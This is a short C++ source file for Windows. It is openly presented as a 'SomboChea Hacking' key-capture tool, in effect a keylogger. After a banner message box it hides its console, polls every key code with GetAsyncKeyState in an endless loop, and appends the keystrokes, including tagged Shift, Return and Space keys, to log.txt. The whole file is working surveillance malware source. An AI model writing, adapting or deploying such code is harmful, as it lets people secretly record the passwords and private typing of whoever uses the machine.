#include <iostream>
#include <Windows.h>

using namespace std;

int Save(int _key, char *file);

/*
int DisplayResourceNAMessageBox()
{
	int msgboxID = MessageBox(
		NULL,
		(LPCWSTR)L"Resource not available\nDo you want to try again?",
		(LPCWSTR)L"Account Details",
		MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
	);

	switch (msgboxID)
	{
	case IDCANCEL:
		// TODO: add code
		break;
	case IDTRYAGAIN:
		// TODO: add code
		break;
	case IDCONTINUE:
		// TODO: add code
		break;
	}

	return msgboxID;
}
*/

int MessageBox()
{
	int msgboxID = MessageBox(
		NULL,
		(LPCWSTR)L"Sombo-Chea Hacking by Key is Started...",
		(LPCWSTR)L"SomboChea Hacking Service",
		MB_ICONWARNING | MB_OK  
	);

	switch (msgboxID)
	{
	case IDOK:
		FreeConsole();
		break;
	}

	return msgboxID;
}

int main() {

	cout << "SomboChea Hacking pentesting tools for key hacking...!" << endl;
	MessageBox();
	char i;

	while (true) {
		Sleep(10);
		for (i = 8;i <= 255;i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, "log.txt");
			}
		}
	}

	return 0;
}

int Save(int _key, char *file) {

	Sleep(10);

	FILE *OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");
	if (_key == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (_key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "");
	else if (_key == VK_LBUTTON)
		fprintf(OUTPUT_FILE, "%s", "");
	else if (_key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[RETURN]");
	else if (_key == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "");
	else if (_key == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", "[SPACE]");
	else
		fprintf(OUTPUT_FILE, "%s", &_key);

	fclose(OUTPUT_FILE);

	return 0;
}

